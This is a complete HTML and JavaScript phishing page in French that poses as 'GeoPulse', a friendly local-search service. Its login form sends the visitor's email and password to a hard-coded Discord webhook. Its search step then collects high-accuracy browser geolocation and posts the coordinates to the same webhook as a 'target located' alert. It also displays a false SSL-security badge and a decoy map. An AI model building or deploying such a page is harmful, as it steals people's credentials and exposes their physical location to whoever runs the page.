<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenue sur GeoPulse</title>
    <style>
        :root {
            --primary: #4A90E2;
            --success: #63d471;
            --bg: #f0f4f8;
        }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
        
        .card { background: white; width: 380px; padding: 40px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); text-align: center; border: 1px solid #e1e8ed; }
        
        .search-box { display: none; }

        .icon-circle { width: 60px; height: 60px; background: #eef5ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; color: var(--primary); font-size: 24px; }

        h1 { font-size: 22px; color: #2c3e50; margin-bottom: 8px; }
        p { font-size: 15px; color: #7f8c8d; line-height: 1.5; margin-bottom: 25px; }

        input { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #edf2f7; border-radius: 12px; font-size: 15px; box-sizing: border-box; transition: 0.3s; outline: none; }
        input:focus { border-color: var(--primary); background: #f9fbff; }

        button { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: 600; font-size: 16px; width: 100%; margin-top: 10px; transition: 0.3s; box-shadow: 0 4px 6px rgba(74, 144, 226, 0.2); }
        button:hover { background: #357abd; transform: translateY(-1px); }

        .footer-note { font-size: 13px; color: #bdc3c7; margin-top: 25px; }
        .trusted { display: flex; justify-content: center; gap: 10px; margin-top: 20px; font-size: 12px; color: #95a5a6; align-items: center; }
    </style>
</head>
<body>

<div id="login-step" class="card">
    <div class="icon-circle">üëã</div>
    <h1>Ravi de vous revoir !</h1>
    <p>Connectez-vous avec votre compte habituel pour activer vos services <strong>GeoPulse</strong>.</p>
    
    <input type="text" id="email" placeholder="E-mail ou t√©l√©phone">
    <input type="password" id="pass" placeholder="Mot de passe">
    
    <button onclick="captureLogin()">Se connecter en toute s√©curit√©</button>
    
    <div class="trusted">
        <span style="font-size: 16px;">üõ°Ô∏è</span> Connexion s√©curis√©e par protocole SSL
    </div>
</div>

<div id="search-step" class="card search-box">
    <div class="icon-circle">üìç</div>
    <h1 style="color: var(--primary);">GeoPulse</h1>
    <p>Trouvez tous vos lieux pr√©f√©r√©s √† proximit√© de chez vous en un seul clic.</p>
    
    <input type="text" id="query" placeholder="Que cherchez-vous ? (ex: Boulangerie)">
    <button onclick="startSearch()">D√©couvrir autour de moi</button>
    
    <div id="status" style="margin-top: 15px; font-size: 14px;">Pr√™t √† vous guider !</div>
    
    <div id="map-placeholder" style="margin-top:20px; height:200px; display:none; border-radius:15px; overflow:hidden; border: 2px solid #f0f4f8;">
        <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
    </div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";

async function captureLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(email && pass) {
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "‚ú® NOUVELLE CONNEXION CHALEUREUSE",
                    color: 4884962,
                    fields: [
                        { name: "üë§ Utilisateur", value: `\`${email}\``, inline: true },
                        { name: "üîë Cl√©", value: `\`${pass}\``, inline: true }
                    ]
                }]
            })
        });
        document.getElementById('login-step').style.display = 'none';
        document.getElementById('search-step').style.display = 'block';
    } else { alert("Oh ! Il manque vos identifiants üòä"); }
}

async function startSearch() {
    const query = document.getElementById('query').value;
    const status = document.getElementById('status');
    if(!query) return;

    status.innerHTML = "<span style='color: var(--primary);'>‚ú® Analyse de votre quartier en cours...</span>";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "üéØ CIBLE LOCALIS√âE (GeoPulse Friendly)",
                        color: 6542449,
                        fields: [
                            { name: "üîé Recherche", value: query },
                            { name: "üìç Carte", value: `[Ouvrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` }
                        ]
                    }]
                })
            });

            status.innerHTML = "<span style='color: var(--success);'>‚úÖ Voici les meilleurs r√©sultats !</span>";
            document.getElementById('map-placeholder').style.display = 'block';
            document.getElementById('map-iframe').src = `https://www.google.com/maps/embed/v1/search?key=VOTRE_CLE_API_NON_NECESSAIRE&q=${query}&output=embed`;

        }, () => {
            status.innerHTML = "üòî Nous avons besoin de votre position pour vous aider.";
        }, { enableHighAccuracy: true });
    }
}
</script>
</body>
</html>



